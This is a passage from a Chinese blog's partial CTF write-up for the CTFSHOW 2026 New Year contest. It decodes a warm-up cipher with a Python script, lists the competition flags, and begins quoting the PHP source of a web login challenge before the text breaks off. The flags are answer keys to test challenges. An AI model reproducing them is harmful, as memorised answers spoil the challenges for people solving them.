<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp) | joke的小世界</title><meta name="author" content="joke"><meta name="copyright" content="joke"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="二.CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)比赛网址：https:&#x2F;&#x2F;ctf.show&#x2F;competitions&#x2F;cs2026 当前积分： 1150   已解出题目数：10   还是很菜的hhh(毕竟需要AI辅助) 1.热身签到12题目描述元旦时，我二舅姥爷给我出的密码题  压缩包里有个flag.txt,内容是： 15451555254545551545654705">
<meta property="og:type" content="article">
<meta property="og:title" content="CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)">
<meta property="og:url" content="https://joke-new.zeabur.app/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/index.html">
<meta property="og:site_name" content="joke的小世界">
<meta property="og:description" content="二.CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)比赛网址：https:&#x2F;&#x2F;ctf.show&#x2F;competitions&#x2F;cs2026 当前积分： 1150   已解出题目数：10   还是很菜的hhh(毕竟需要AI辅助) 1.热身签到12题目描述元旦时，我二舅姥爷给我出的密码题  压缩包里有个flag.txt,内容是： 15451555254545551545654705">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://picsum.photos/1920/1080?random=1">
<meta property="article:published_time" content="2026-01-04T08:21:23.000Z">
<meta property="article:modified_time" content="2026-02-09T15:05:37.916Z">
<meta property="article:author" content="joke">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="ctfshow">
<meta property="article:tag" content="misc">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://picsum.photos/1920/1080?random=1"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)",
  "url": "https://joke-new.zeabur.app/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/",
  "image": "https://picsum.photos/1920/1080?random=1",
  "datePublished": "2026-01-04T08:21:23.000Z",
  "dateModified": "2026-02-09T15:05:37.916Z",
  "author": [
    {
      "@type": "Person",
      "name": "joke",
      "url": "https://joke-new.zeabur.app"
    }
  ]
}</script><link rel="shortcut icon" href="/img/9.jpg"><link rel="canonical" href="https://joke-new.zeabur.app/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/css/transparent.css"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.1"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/pink/pace-theme-minimal.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div class="bg-animation" id="web_bg" style="background-color: #eee;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://picsum.photos/1920/1080?random=1);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/9.jpg" alt="Logo"><span class="site-name">joke的小世界</span></a><a class="nav-page-title" href="/"><span class="site-name">CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-04T08:21:23.000Z" title="发表于 2026-01-04 16:21:23">2026-01-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-09T15:05:37.916Z" title="更新于 2026-02-09 23:05:37">2026-02-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/ctf-wp/">ctf-wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="二-CTFSHOW-2026元旦跨年欢乐赛-CS2026-个人写的部分wp"><a href="#二-CTFSHOW-2026元旦跨年欢乐赛-CS2026-个人写的部分wp" class="headerlink" title="二.CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)"></a>二.CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)</h1><p>比赛网址：<a target="_blank" rel="noopener" href="https://ctf.show/competitions/cs2026">https://ctf.show/competitions/cs2026</a></p>
<p>当前积分： 1150   已解出题目数：10   还是很菜的hhh(毕竟需要AI辅助)</p>
<h2 id="1-热身签到"><a href="#1-热身签到" class="headerlink" title="1.热身签到"></a>1.热身签到</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">元旦时，我二舅姥爷给我出的密码题</span><br></pre></td></tr></table></figure>

<p>压缩包里有个flag.txt,内容是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">54515552545455515456547055555566545654495548554855575370515051485150515453705555545755525456537054515551515051485150515450495568</span><br></pre></td></tr></table></figure>

<p>这样的数字特征暗示我们可能要把这些数字转换成ASCII码，但数字个数太多了，有104位，所以不妨两位一组试试，</p>
<p>这里解释一下原因（我表达方式不太行AI生成一下），然后把每组数字先转为十进制（其实他本身就是了），每组转成对应的ASCII码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">104 是一个偶数！在密码学和编码学中，“偶数长度”是一个非常强烈的信号，它暗示着数据可能是成对处理的。为什么？因为计算机中最基础的单位“字节(Byte)”经常被表示为两个十六进制数，或者其他两位一组的形式。</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">原始分组</th>
<th align="center">十进制值</th>
<th align="center">对应字符</th>
</tr>
</thead>
<tbody><tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">52</td>
<td align="center">52</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">56</td>
<td align="center">56</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">70</td>
<td align="center">70</td>
<td align="center">F</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">66</td>
<td align="center">66</td>
<td align="center">B</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">56</td>
<td align="center">56</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">49</td>
<td align="center">49</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">48</td>
<td align="center">48</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">48</td>
<td align="center">48</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">57</td>
<td align="center">57</td>
<td align="center">9</td>
</tr>
<tr>
<td align="center">53</td>
<td align="center">53</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">70</td>
<td align="center">70</td>
<td align="center">F</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">50</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">48</td>
<td align="center">48</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">50</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">53</td>
<td align="center">53</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">70</td>
<td align="center">70</td>
<td align="center">F</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">57</td>
<td align="center">57</td>
<td align="center">9</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">52</td>
<td align="center">52</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">56</td>
<td align="center">56</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">53</td>
<td align="center">53</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">70</td>
<td align="center">70</td>
<td align="center">F</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">50</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">48</td>
<td align="center">48</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">50</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">50</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">49</td>
<td align="center">49</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">68</td>
<td align="center">68</td>
<td align="center">D</td>
</tr>
</tbody></table>
<p>因此就有了一个十六进制字符串：（这里可以展开学学base16）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">63746673686F777B68617070795F323032365F776974685F637332303236217D</span><br></pre></td></tr></table></figure>

<p>放入随波逐流一键解密,flag就出来了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;happy_2026_with_cs2026!&#125;</span><br></pre></td></tr></table></figure>

<p>或者使用古法脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def decrypt_cipher(cipher_text):</span><br><span class="line">    try:</span><br><span class="line">        # Step 1: 将字符串每2位切分，解析为十进制 ASCII 码，还原为中间字符串</span><br><span class="line">        # 例如: &quot;54&quot; -&gt; int(54) -&gt; chr(54) -&gt; &quot;6&quot;</span><br><span class="line">        intermediate_hex = &quot;&quot;.join(</span><br><span class="line">            [chr(int(cipher_text[i:i+2])) for i in range(0, len(cipher_text), 2)]</span><br><span class="line">        )</span><br><span class="line">        print(f&quot;中间层 Hex 字符串: &#123;intermediate_hex&#125;&quot;)</span><br><span class="line">        # Step 2: 将中间的 Hex 字符串解码为最终明文</span><br><span class="line">        # bytes.fromhex() 是 Python 处理十六进制转换的高效方法</span><br><span class="line">        plaintext = bytes.fromhex(intermediate_hex).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        return plaintext</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return f&quot;解密过程中出错: &#123;e&#125;&quot;</span><br><span class="line"># 输入数据</span><br><span class="line">cipher = &quot;54515552545455515456547055555566545654495548554855575370515051485150515453705555545755525456537054515551515051485150515450495568&quot;</span><br><span class="line"># 执行解密</span><br><span class="line">result = decrypt_cipher(cipher)</span><br><span class="line">print(f&quot;最终 Flag: &#123;result&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p>flag也是可以出的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;happy_2026_with_cs2026!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-cs2026问卷调查"><a href="#2-cs2026问卷调查" class="headerlink" title="2.cs2026问卷调查"></a>2.cs2026问卷调查</h2><p>问卷调查即可得到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;happy_2026&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-SafePassword"><a href="#3-SafePassword" class="headerlink" title="3.SafePassword"></a>3.SafePassword</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">1. 根据情报，J国近年来对我国进行了持续的渗透攻击，我方技术人员经过溯源，发现某个可疑网址。</span><br><span class="line"></span><br><span class="line">2. 该网址疑似为J国的情报组织任务分配中心，但是我方并没有拿到登陆口令，无法继续深入。</span><br><span class="line"></span><br><span class="line">3. 已经确认嫌疑账号用户名为jcenter，此人2025年加入该组织，登陆口令未知。</span><br></pre></td></tr></table></figure>

<p>题目附件是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">declare(strict_types=1);</span><br><span class="line">session_start();</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">const USER_NOT_FOUND       = 2000;</span><br><span class="line">const USER_DISABLED        = 2003;</span><br><span class="line">const CHANNEL_INVALID      = 2007;</span><br><span class="line">const CHANNEL_EXPIRED      = 2011;</span><br><span class="line">const CHANNEL_BLOCKED      = 2017;</span><br><span class="line">const VERIFY_FAILED        = 2025;</span><br><span class="line">const RATE_LIMITED         = 2033;</span><br><span class="line">const PERMISSION_DENIED    = 2048;</span><br><span class="line">const STATE_CONFLICT       = 2064;</span><br><span class="line">const LENGTH_ERROR        = 0x52C0FE;</span><br><span class="line"></span><br><span class="line">const ERROR_CODES = [</span><br><span class="line">    USER_NOT_FOUND,</span><br><span class="line">    USER_DISABLED,</span><br><span class="line">    CHANNEL_INVALID,</span><br><span class="line">    CHANNEL_EXPIRED,</span><br><span class="line">    CHANNEL_BLOCKED,</span><br><span class="line">    VERIFY_FAILED,</span><br><span class="line">    RATE_LIMITED,</span><br><span class="line">    PERMISSION_DENIED,</span><br><span class="line">    STATE_CONFLICT,</span><br><span class="line">    LENGTH_ERROR,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function ensureCsrf(): string</span><br><span class="line">&#123;</span><br><span class="line">    if (!isset($_SESSION[&#x27;csrf&#x27;]) || !is_string($_SESSION[&#x27;csrf&#x27;]) || $_SESSION[&#x27;csrf&#x27;] === &#x27;&#x27;) &#123;</span><br><span class="line">        $_SESSION[&#x27;csrf&#x27;] = bin2hex(random_bytes(16));</span><br><span class="line">    &#125;</span><br><span class="line">    return $_SESSION[&#x27;csrf&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function requirePostCsrf(): void</span><br><span class="line">&#123;</span><br><span class="line">    $csrf = $_POST[&#x27;csrf&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">    if (!is_string($csrf) || !isset($_SESSION[&#x27;csrf&#x27;]) || !is_string($_SESSION[&#x27;csrf&#x27;]) || !hash_equals($_SESSION[&#x27;csrf&#x27;], $csrf)) &#123;</span><br><span class="line">        http_response_code(400);</span><br><span class="line">        exit(&#x27;Bad CSRF&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function h(string $s): string</span><br><span class="line">&#123;</span><br><span class="line">    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, &#x27;UTF-8&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isLoggedIn(): bool</span><br><span class="line">&#123;</span><br><span class="line">    return isset($_SESSION[&#x27;authed&#x27;]) &amp;&amp; 